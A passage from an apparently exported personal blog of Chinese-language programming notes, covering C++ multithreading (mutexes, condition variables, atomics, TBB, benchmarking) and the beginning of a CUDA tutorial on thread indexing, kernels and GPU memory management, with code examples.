m_arr.push_back(val); &#125; size_t size() const &#123; std::shared_lock grd(m_mtx); return m_arr.size(); &#125;&#125;; 只需一次上锁的访问者模式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; std::mutex m_mtx;public: class Accessor &#123; MTVector &amp;m_that; std::unique_lock&lt;std::mutex&gt; m_guard; public: Accessor(MTVector &amp;that) : m_that(that), m_guard(that.m_mtx) &#123;&#125; void push_back(int val) const &#123; return m_that.m_arr.push_back(val); &#125; size_t size() const &#123; return m_that.m_arr.size(); &#125; &#125;; Accessor access() &#123; return &#123;*this&#125;; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; auto axr = arr.access(); # Accessor 构造函数上锁 for (int i = 0; i &lt; 1000; i++) &#123; axr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; auto axr = arr.access(); for (int i = 0; i &lt; 1000; i++) &#123; axr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.access().size() &lt;&lt; std::endl; return 0;&#125; 条件变量 条件变量cv.wait(lck) 将会让当前线程陷入等待。在其他线程中调用 cv.notify_one() 则会唤醒那个陷入等待的线程。 cv.notify_one() 只会唤醒其中一个等待中的线程，而 cv.notify_all() 会唤醒全部。 还可以额外指定一个参数，变成 cv.wait(lck, expr) 的形式，其中 expr 是个 lambda 表达式，只有其返回值为 true 时才会真正唤醒，否则继续等待。wait() 的过程中会暂时 unlock() 这个锁。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;mutex&gt;#include &lt;condition_variable&gt;int main() &#123; std::condition_variable cv; std::mutex mtx; bool ready = false; std::thread t1([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck, [&amp;] &#123; return ready; &#125;); std::cout &lt;&lt; \"t1 is awake\" &lt;&lt; std::endl; &#125;); std::cout &lt;&lt; \"notifying not ready\" &lt;&lt; std::endl; cv.notify_one(); // useless now, since ready = false ready = true; std::cout &lt;&lt; \"notifying ready\" &lt;&lt; std::endl; cv.notify_one(); // awakening t1, since ready = true t1.join(); return 0;&#125; std::condition_variable 必须和 std::unique_lock&lt;std::mutex&gt; 一起用。因为要保证多个线程被唤醒时 ( cv.notify_all() )，只有一个能够被启动。 std::condition_variable 仅仅支持 std::unique_lock&lt;std::mutex&gt; 作为 wait 的参数，如果需要用其他类型的 mutex 锁，可以用 std::condition_variable_any。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;#include &lt;condition_variable&gt;int main() &#123; std::condition_variable cv; std::mutex mtx; std::thread t1([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t1 is awake\" &lt;&lt; std::endl; &#125;); std::thread t2([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t2 is awake\" &lt;&lt; std::endl; &#125;); std::thread t3([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t3 is awake\" &lt;&lt; std::endl; &#125;); std::this_thread::sleep_for(std::chrono::milliseconds(400)); std::cout &lt;&lt; \"notifying one\" &lt;&lt; std::endl; cv.notify_one(); // awakening t1 only std::this_thread::sleep_for(std::chrono::milliseconds(400)); std::cout &lt;&lt; \"notifying all\" &lt;&lt; std::endl; cv.notify_all(); // awakening t1 and t2 t1.join(); t2.join(); t3.join(); return 0;&#125; 实现生成者消费者 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;#include &lt;condition_variable&gt;template &lt;class T&gt;class MTQueue &#123; std::condition_variable m_cv; std::mutex m_mtx; std::vector&lt;T&gt; m_arr;public: T pop() &#123; std::unique_lock lck(m_mtx); m_cv.wait(lck, [this] &#123; return !m_arr.empty(); &#125;); T ret = std::move(m_arr.back()); m_arr.pop_back(); return ret; &#125; auto pop_hold() &#123; std::unique_lock lck(m_mtx); m_cv.wait(lck, [this] &#123; return !m_arr.empty(); &#125;); T ret = std::move(m_arr.back()); m_arr.pop_back(); return std::pair(std::move(ret), std::move(lck)); &#125; void push(T val) &#123; std::unique_lock lck(m_mtx); m_arr.push_back(std::move(val)); m_cv.notify_one(); &#125; void push_many(std::initializer_list&lt;T&gt; vals) &#123; std::unique_lock lck(m_mtx); std::copy( std::move_iterator(vals.begin()), std::move_iterator(vals.end()), std::back_insert_iterator(m_arr)); m_cv.notify_all(); &#125;&#125;;int main() &#123; MTQueue&lt;int&gt; foods; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 2; i++) &#123; auto food = foods.pop(); std::cout &lt;&lt; \"t1 got food:\" &lt;&lt; food &lt;&lt; std::endl; &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 2; i++) &#123; auto food = foods.pop(); std::cout &lt;&lt; \"t2 got food:\" &lt;&lt; food &lt;&lt; std::endl; &#125; &#125;); foods.push(42); foods.push(233); foods.push_many(&#123;666, 4399&#125;); t1.join(); t2.join(); return 0;&#125; 原子操作 多个线程同时往一个 int 变量里累加，这样肯定会出错，因为 counter += i 在 CPU 看来会变成三个指令： 读取 counter 变量到 rax 寄存器 rax 寄存器的值加上 1 把 rax 写入到 counter 变量 现代 CPU 为了高效，使用了大量奇技淫巧，比如他会把一条汇编指令拆分成很多微指令 (micro-ops)，三个甚至有点保守估计了。 现代 CPU 还有高速缓存，乱序执行，指令级并行等优化策略，你根本不知道每条指令实际的先后顺序。 mutex 太过重量级，他会让线程被挂起，从而需要通过系统调用，进入内核层，调度到其他线程执行，有很大的开销。只是想要修改一个小小的 int 变量而已，用昂贵的 mutex 严重影响了效率。 atomic 更轻量级的 atomic，对他的 += 等操作，会被编译器转换成专门的指令。 CPU 识别到该指令时，会锁住内存总线，放弃乱序执行等优化策略（将该指令视为一个同步点，强制同步掉之前所有的内存操作），从而向你保证该操作是原子 (atomic) 的，不可分割的。 只需把 int 改成 atomic 即可。写法也有讲究： 123counter = counter + 1; // 错，不能保证原子性counter += 1; // OK，能保证原子性counter++; // OK，能保证原子性 除了用方便的运算符重载之外，还可以直接调用相应的函数名，比如： fetch_add 对应于 +=；store 对应于 =；load 用于读取其中的 int 值。 fetch_add会返回其旧值： 1int old = atm.fetch_add(val) 除了会导致 atm 的值增加 val 外，还会返回 atm 增加前的值，存储到 old。 当然这里也可以 counter++，不过要追加多个的话还是得用到 counter.fetch_add(n)。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;atomic&gt;#include &lt;vector&gt;int main() &#123; std::atomic&lt;int&gt; counter; counter.store(0); std::vector&lt;int&gt; data(20000); std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 10000; i++) &#123; int index = counter.fetch_add(1); data[index] = i; &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 10000; i++) &#123; int index = counter.fetch_add(1); data[index] = i + 10000; &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; data[10000] &lt;&lt; std::endl; return 0;&#125; exchange(val) 会把 val 写入原子变量，同时返回其旧的值。 12345678910111213141516#include &lt;iostream&gt;#include &lt;atomic&gt;int main() &#123; std::atomic&lt;int&gt; counter; counter.store(0); int old = counter.exchange(3); std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 0 int now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 3 return 0;&#125; compare_exchange_strong(old, val) ，会读取原子变量的值，比较他是否和 old 相等。如果不相等，则把原子变量的值写入 old。如果相等，则把 val 写入原子变量。返回一个 bool 值，表示是否相等。注意 old 这里传的其实是一个引用。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;atomic&gt;int main() &#123; boolalpha(std::cout); std::atomic&lt;int&gt; counter; counter.store(2); int old = 1; bool equal = counter.compare_exchange_strong(old, 3); std::cout &lt;&lt; \"equal=\" &lt;&lt; equal &lt;&lt; std::endl; // false std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 2 int now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 2 equal = counter.compare_exchange_strong(old, 3); std::cout &lt;&lt; \"equal=\" &lt;&lt; equal &lt;&lt; std::endl; // true std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 2 now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 3 return 0;&#125; compare_exchange_strong 的逻辑，一般简称 CAS (compare-and-swap)，他是并行编程最常用的原子操作之一。实际上任何 atomic 操作，包括 fetch_add，都可以基于 CAS 来实现：这就是 Taichi 实现浮点数 atomic_add 的方法。 并发与并行 并发（时间片调度）：单核处理器，操作系统通过时间片调度算法，轮换着执行着不同的线程，看起来就好像是同时运行一样，其实每一时刻只有一个线程在运行。目的：异步地处理多个不同的任务，避免同步造成的阻塞。 并行（物理核心并行）：多核处理器，每个处理器执行一个线程，真正的同时运行。目的：将一个任务分派到多个核上，从而更快完成任务。 开源工具：因特尔开源的并行编程库TBB（注意使用 2021.5 之前的版本，而不是最近改名成 OneTBB 的版本） 1sudo apt-get install libtbb-dev TBB简介 使用任务组，组织任务。一个任务不一定对应一个线程，如果任务数量超过CPU最大的线程数，会由 TBB 在用户层负责调度任务运行在多个预先分配好的线程，而不是由操作系统负责调度线程运行在多个物理核心。 TBB任务队列调度使用 工作窃取法（work-stealing），每个线程一个任务队列，做完本职工作后可以认领其他线程的任务。而不是原始的单一任务队列。 提供了并发版本的STL容器， tbb::concurrent_vector、tbb::concurrent_map 等。 优化了流水线工作流程，更好地利用缓存和程序的局部性。 性能测试工具 git上下载代码库，进行简单测试。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;benchmark/benchmark.h&gt;constexpr size_t n = 1&lt;&lt;27;std::vector&lt;float&gt; a(n);void BM_for(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; // fill a with sin(i) for (size_t i = 0; i &lt; a.size(); i++) &#123; a[i] = std::sin(i); &#125; &#125;&#125;BENCHMARK(BM_for);void BM_reduce(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; // calculate sum of a float res = 0; for (size_t i = 0; i &lt; a.size(); i++) &#123; res += a[i]; &#125; // 因为 res 并没有被使用，防止编译优化掉这段for循环 benchmark::DoNotOptimize(res); &#125;&#125;BENCHMARK(BM_reduce);BENCHMARK_MAIN(); 12345678910111213141516171819cmake_minimum_required(VERSION 3.10)set(CMAKE_CXX_STANDARD 17)set(CMAKE_BUILD_TYPE Release)project(main LANGUAGES CXX)add_executable(main main.cpp)#find_package(OpenMP REQUIRED)#target_link_libraries(main PUBLIC OpenMP::OpenMP_CXX)find_package(TBB REQUIRED)target_link_libraries(main PUBLIC TBB::tbb)# 注意 OFF 这个设置，关闭后不会搜索是否在系统环境安装了google test 工具包set(BENCHMARK_ENABLE_TESTING OFF CACHE BOOL \"Turn off the fking test!\")add_subdirectory(benchmark)target_link_libraries(main PUBLIC benchmark)","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"}],"author":"HeRui"},{"title":"CUDA 笔记","slug":"CUDA-笔记","date":"2023-08-15T15:14:28.000Z","updated":"2024-01-09T10:18:30.974Z","comments":true,"path":"posts/244a647.html","link":"","permalink":"https://racleray.github.io/posts/244a647.html","excerpt":"CUDA笔记","text":"NVCC文档 异构计算 CPU和GPU是两个独立的处理器，它们通过单个计算节点中的PCI-Express总线相连。 GPU不是一个独立运行的平台而是CPU的协处理器。因此，GPU必须通过PCIe总线与基于CPU的主机相连进行操作。 GPU：计算单元多，控制单元少，无大量Cache。 CPU：计算单元少，控制单元多， Cache占据了大量空间。 一个异构应用包括两部分：主机代码和设备代码。主机代码在CPU上运行，设备代码在GPU上运行。 程序通常由CPU初始化。在设备端加载计算密集型任务之前，CPU代码负责管理设备端的环境、代码和数据。 CPU适合处理数据规模较小、控制密集型任务，GPU适合处理数据规模较大、包含数据并行的计算密集型任务。 CUDA硬件环境 GPU架构：Tesla、Fermi、Kepler、Maxwell、Pascal、Volta、Turing、Ampere 显卡系列：GeForce、Quadro、Tesla、Jetson。 GeForce：主要用于游戏和娱乐，也用于科学计算。 Quadro：专业图形设计。 Tesla：服务器专用卡，用于大规模并行计算，适用于机器学习。 Jetson：适用于AI应用。 NVIDIA使用“计算能力”来对应硬件版本。 NVIDIA Amperep Architecture （compute capabilities 8.x)： Tesla A Series NVIDIA Turing Architecture （compute capabilities 7.x)： GeForce 2000 Series Quadro RTX Series Tesla T Series NVIDIA Volta Architecture (compute capabilities 7.x): DRIVE/JETSON AGX/Xavier Quadro GV Series Tesla v Series NVIDIA Pascal Architecture (compute capabilities 6.x): Tegra X2 GeForce 1000 Series Quadro P Series Tesla P Series 重要概念 thread: 一个CUDA的并行程序会被以许多个thread来执行。 block: 数个thread组成一个block，同一个block中的thread可以同步，也可以通过shared memory进行通信。 grid: 多个block则会再构成grid。 实际在硬件上就是按照 SM(Streaming MultiProcessor) 组织计算单元的。一个SM由多个流式单处理器（SP）组成。每个 SP 可以处理一个或多个线程。 SM采用的SIMT(Single-Instruction, Multiple-Thread，单指令多线程)架构，warp(线程束)是最基本的执行单元，一个warp包含32个并行thread。warp(线程束)由warp scheduler负责调度。 当一个kernel被执行时，gird中的block被分配到SM上，一个block的thread只能在一个SM上调度。 通常板块数量总是大于 SM 的数量，这时英伟达驱动就会在多个 SM 之间调度你提交的各个板块。正如操作系统在多个 CPU 核心之间调度线程那样。 GPU 不会像 CPU 那样做时间片轮换——板块一旦被调度到了一个 SM 上，就会一直执行，直到他执行完退出，这样的好处是不存在保存和切换上下文（寄存器，共享内存等）的开销，毕竟 GPU 的数据量比较大，禁不起这样切换来切换去。 一个grid可以包含多个block，block的组织方式可以是一维的，二维或者三维的。 CUDA中每一个线程都有一个唯一的标识ID即threadIdx，这个ID随着grid和block的划分方式的不同而变化。 根据架构的不同，计算threadIdx需要考虑不同的维度。 版本52：Quadro M6000 , GeForce 900, GTX-970, GTX-980, GTX Titan X 版本53：Tegra (Jetson) TX1 / Tegra X1, Drive CX, Drive PX, Jetson Nano 版本60：Quadro GP100, Tesla P100, DGX-1 (Generic Pascal) 版本61：GTX 1080, GTX 1070, GTX 1060, GTX 1050, GTX 1030 (GP108), GT 1010 (GP108) Titan Xp, Tesla P40, Tesla P4, Discrete GPU on the NVIDIA Drive PX2 版本62：Integrated GPU on the NVIDIA Drive PX2, Tegra (Jetson) TX2 版本70：DGX-1 with Volta, Tesla V100, GTX 1180 (GV104), Titan V, Quadro GV100 版本72：Jetson AGX Xavier, Drive AGX Pegasus, Xavier NX 版本75：GTX/RTX Turing – GTX 1660 Ti, RTX 2060, RTX 2070, RTX 2080, Titan RTX, Quadro RTX 4000, Quadro RTX 5000, Quadro RTX 6000, Quadro RTX 8000, Quadro T1000/T2000, Tesla T4 版本80：NVIDIA A100 (the name “Tesla” has been dropped – GA100), NVIDIA DGX-A100 版本86：Tesla GA10x cards, RTX Ampere – RTX 3080, GA102 – RTX 3090, RTX A2000, A3000, A4000, A5000, A6000, NVIDIA A40, GA106 – RTX 3060, GA104 – RTX 3070, GA107 – RTX 3050, Quadro A10, Quadro A16, Quadro A40, A2 Tensor Core GPU 使用NVCC编译，需要注意版本号： 1nvcc -arch=sm_60 -o test1 .\\test1.cu -run 使用CMake，可以指定多个可选版本号，但是会增加编译时间： 123456789cmake_minimum_required(VERSION 3.10)set(CMAKE_CXX_STANDARD 17)set(CMAKE_BUILD_TYPE Release)set(CMAKE_CUDA_ARCHITECTURES 60;70;75;86)project(hellocuda LANGUAGES CXX CUDA)add_executable(test test.cu) CUDA软件体系 CUDA cuFFT ：利用CUDA进行快速傅里叶变换的函数库 。 cuBLAS：线性代数方面的CUDA库。 cuDNN ：利用CUDA进行深度卷积神经网络，深度学习常用。 thrust：实现了众多基本并行算法的C++模板库。 cuSolver：线性代数方面的CUDA库。 cuRAND：随机数生成有关的库。 CUDA API CUDA 运行时 API和CUDA 驱动API提供了实现设备管理、上下文管理、存储器管理、代码块管理、执行控制、 纹理索引管理与OpenGL和Direct3D的互操作性的应用接口。 驱动API是一种基于句柄的底层接口，大多数对象通过句柄被引用，其函数前缀均为cu。 运行时API对驱动API进行了一定的封装，隐藏了其部分实现细节，因此使用起来更为方便，简化了编程的过程。 CUDA CUDA是一种通用的并行计算平台和编程模型，是在C语言基础上扩展的。借助于CUDA，可以像编写C语言程序一样实现并行算法。 CUDA编程模型是一个异构模型，需要CPU和GPU协同工作，因此引入了主机(Host)端与设备 (Device)端的概念。 一个完整的CUDA程序由主机代码（串行代码）和设备代码（并行代码）组成。 CUDA程序实现流程 CUDA内存管理 CUDA运行时负责分配与释放设备内存，并且在主机内存和设备内存之间传输数据。 CUDA编程基础 CUDA程序主要由两部分组成，一部分是主函数，另一部分是设备函数。 __global__ 定义一个kernel函数入口函数，一般在CPU上调用，GPU上执行。函数类型必须为void类型。 __device__ 定义在device（GPU）执行的函数。 __host__ 定义在host（CPU）执行的函数。 使用nvcc对 .cu 源代码文件进行编译。 了 CUDA 的核函数调用时需要用 kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;() 这种语法。&lt;&lt;&lt;block数量，每个板块中的线程数量&gt;&gt;&gt;的形式，也就是&lt;&lt;&lt;gridDim, blockDim&gt;&gt;&gt;。总的板块数量由gridDim表示。 线程(thread)：并行的最小单位 板块(block)：包含若干个线程 网格(grid)：指整个任务，包含若干个板块 线程＜板块＜网格 GPU 的板块相当于 CPU 的线程，GPU 的线程相当于 CPU 的SIMD，可以这样理解，但不完全等同。 CUDA 也支持三维的板块和线程区间。只要在三重尖括号内指定的参数改成 dim3 类型即可。 12345678910111213141516#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;__global__ void kernel() &#123; printf(\"Block (%d,%d,%d) of (%d,%d,%d), Thread (%d,%d,%d) of (%d,%d,%d)\\n\", blockIdx.x, blockIdx.y, blockIdx.z, gridDim.x, gridDim.y, gridDim.z, threadIdx.x, threadIdx.y, threadIdx.z, blockDim.x, blockDim.y, blockDim.z);&#125;int main() &#123; kernel&lt;&lt;&lt;dim3(2, 1, 1), dim3(2, 2, 2)&gt;&gt;&gt;(); cudaDeviceSynchronize(); return 0;&#125; 二维的话，只需要把 dim3 最后一位（z方向）的值设为 1 即可。 线程索引 CUDA硬件环境部分，介绍了硬件在软件中的组织形式，所以可以计算： 1、 grid 1维，block 1维（blockDim 表示每一维的size, blockIdx表示在grid中的位置，threadIdx表示在block中的位置） 1int threadId = blockIdx.x * blockDim.x + threadIdx.x; 2、 grid 1维，block 2维 1int threadId = blockIdx.x * blockDim.x * blockDim.y + threadIdx.y * blockDim.x + threadIdx.x; 3、 grid 1维，block 3维 1234int threadId = blockIdx.x * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.y * blockDim.x \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 4、 grid 2维，block 1维 12int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x + threadIdx.x; 5、 grid 2维，block 2维 1234int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 6、 grid 2维，block 3维 12345int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 7、 grid 3维，block 1维 1234int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x + threadIdx.x; 8、 grid 3维，block 2维 123456int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 9、 grid 3维，block 3维 1234567int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; CUDA编程 CUDA 的语法，基本完全兼容 C++。包括 C++17 新特性，都可以用。甚至可以把任何一个 C++ 项目的文件后缀名全部改成 .cu，都能编译出来。 CUDA 和 C++ 的关系就像 C++ 和 C 的关系一样，大部分都兼容，因此能很方便地重用 C++ 现有的任何代码库，引用 C++ 头文件等。 代码执行 __global__ 定义函数 kernel（从 CPU 端通过三重尖括号语法调用），前面加上 __global__ 修饰符，即可让他在 GPU 上执行。不可以有返回值。 GPU 和 CPU 之间的通信，为了高效，是异步的。CPU实际上只是把 kernel 这个任务推送到 GPU 的执行队列上，然后立即返回，并不会等待GPU执行完毕。 可以调用 cudaDeviceSynchronize()，让 CPU 陷入等待，等 GPU 完成队列的所有任务后再返回。 核函数调用核函数 从 Kelper 架构开始，__global 里可以调用另一个 __global，也就是说核函数可以调用另一个核函数，且其三重尖括号里的板块数和线程数可以动态指定。 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;__global__ void another() &#123; printf(\"another: Thread %d of %d\\n\", threadIdx.x, blockDim.x);&#125;__global__ void kernel() &#123; printf(\"kernel: Thread %d of %d\\n\", threadIdx.x, blockDim.x); int numthreads = threadIdx.x * threadIdx.x + 1; another&lt;&lt;&lt;1, numthreads&gt;&gt;&gt;(); printf(\"kernel: called another with %d threads\\n\", numthreads);&#125;int main() &#123; kernel&lt;&lt;&lt;1, 3&gt;&gt;&gt;(); cudaDeviceSynchronize(); return 0;&#125; __device__ __device__ 则用于定义设备函数，他在 GPU 上执行，但是从 GPU 上调用的，而且不需要三重尖括号，和普通函数用起来一样，可以有参数，有返回值。 默认情况下 GPU 函数必须定义在同一个文件里。如果你试图分离声明和定义，调用另一个文件里的 __device 或 __global 函数，就会出错。 建议把要相互调用的 __device__ 函数放在同一个文件，这样方便编译器自动内联优化。 __host 则相反，将函数定义在 CPU 上。任何函数如果没有指明修饰符，则默认就是 __host。 通过 __host __device 这样的双重修饰符，可以把函数同时定义在 CPU 和 GPU 上。 总结 host 可以调用 global；global 可以调用 device；device 可以调用 device。 CUDA内联 inline 在现代 C++ 中的效果是声明一个函数为 weak 符号，和性能优化意义上的内联无关。 优化意义上的内联指把函数体直接放到调用者那里去。CUDA 编译器提供了__inline__ 来声明一个函数为内联。不论是 CPU 函数还是 GPU 都可以使用，只要你用的 CUDA 编译器。 __inline__ 不一定就保证内联了，如果函数太大编译器可能会放弃内联化。 因此 CUDA 还提供 __forceinline 这个关键字来强制一个函数为内联。GCC 也有相应的 __attribute((“always_inline”))。 还有 __noinline__ 来禁止内联优化。 constexpr 函数 指定 --expt-relaxed-constexpr 这个编译选项，把 constexpr 函数自动变成修饰 __host __device。因为 constexpr 通常都是一些可以内联的函数，数学计算表达式之类的。 当然，constexpr 里没办法调用 printf，也不能用 __syncthreads 之类的 GPU 特有的函数，因此也不能完全替代 __host 和 __device。 内存管理 从核函数里返回数据 GPU 使用独立的显存，不能访问 CPU 内存。CPU 的内存称为主机内存(host)。GPU 使用的内存称为设备内存(device)，他是显卡上板载的，速度更快，又称显存。 用 cudaMalloc 分配 GPU 上的显存，这样就不出错了，结束时 cudaFree 释放。cudaMalloc 的返回值已经用来表示错误代码，所以只能通过 &amp;pret 二级指针返回结果。 1234567891011121314151617#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMalloc(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); checkCudaErrors(cudaDeviceSynchronize()); printf(\"result: %d\\n\", *pret); cudaFree(pret); return 0;&#125; helper_cuda.h 在 /opt/cuda/samples/common/inc/helper_cuda.h ，可以直接将其和 helper_string.h 一起拷贝到指定的 include 文件夹下，使用一些封装好的功能。 这里比如保存在 .cu 文件的同级目录下include文件夹下，更改CMake文件： 1target_include_directories(main PUBLIC ./include) 使用 checkCudaErrors 宏可自动帮你检查错误代码并打印在终端，然后退出。还会报告出错所在的行号，函数名等。 使用nvcc编译，就添加 --include-path 编译选项。 跨 GPU/CPU 地址空间拷贝数据 cudaMemcpy，他能够在 GPU 和 CPU 内存之间拷贝数据。 cudaMemcpy 会自动进行同步操作，即会调用 cudaDeviceSynchronize() ！ 1234567891011121314151617181920#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMalloc(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); int ret; checkCudaErrors(cudaMemcpy(&amp;ret, pret, sizeof(int), cudaMemcpyDeviceToHost)); printf(\"result: %d\\n\", ret); cudaFree(pret); return 0;&#125; 统一内存地址技术（Unified Memory） 一种在比较新的显卡上支持的特性，那就是统一内存(managed)，只需把 cudaMalloc 换成 cudaMallocManaged 即可，释放时也是通过 cudaFree。 从 Pascal 架构开始支持的，也就是 GTX9 开头及以上。 这样分配出来的地址，不论在 CPU 还是 GPU 上都是一模一样的，都可以访问。而且拷贝也会自动按需进行（当从 CPU 访问时），无需手动调用 cudaMemcpy。 虽然方便，但并非完全没有开销，手动拷贝可能高效一些。 1234567891011121314151617#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMallocManaged(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); checkCudaErrors(cudaDeviceSynchronize()); printf(\"result: %d\\n\", *pret); cudaFree(pret); return 0;&#125; 总结 主机内存(host)：malloc、free 设备内存(device)：cudaMalloc、cudaFree 统一内存(managed)：cudaMallocManaged、cudaFree C++封装 定制CudaAllocator，构建在GPU上的vector对象。 注意，vector 在初始化的时候（或是之后 resize 的时候）会调用所有元素的无参构造函数，对 int 类型来说就是零初始化。然而这个初始化会是在 CPU 上做的，因此我们需要禁用他。 通过给 allocator 添加 construct 成员函数，来魔改 vector 对元素的构造。 只需要判断是不是有参数，然后是不是传统的 C 语言类型（plain-old-data），如果是，则跳过其无参构造，从而避免在 CPU 上低效的零初始化。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; // 只需要判断是不是有参数，是不是传统的 C 语言类型（plain-old-data） // 如果是，则跳过其无参构造，从而避免在 CPU 上低效的零初始化 if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;int N, class T&gt;__global__ void kernel(T *arr) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; N; i += blockDim.x * gridDim.x) &#123; arr[i] = i; &#125;&#125;int main() &#123; constexpr int n = 65536; std::vector&lt;int, CudaAllocator&lt;int&gt;&gt; arr(n); kernel&lt;n&gt;&lt;&lt;&lt;32, 128&gt;&gt;&gt;(arr.data()); checkCudaErrors(cudaDeviceSynchronize()); for (int i = 0; i &lt; n; i++) &#123; printf(\"arr[%d]: %d\\n\", i, arr[i]); &#125; return 0;&#125; 核函数可以是一个模板函数 CUDA 的优势在于对 C++ 的完全支持。所以 __global__ 修饰的核函数自然也是可以为模板函数的。 调用模板时一样可以用自动参数类型推导，如有手动指定的模板参数（单尖括号）请放在三重尖括号的前面。 核函数可以接受 functor，实现函数式编程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;class 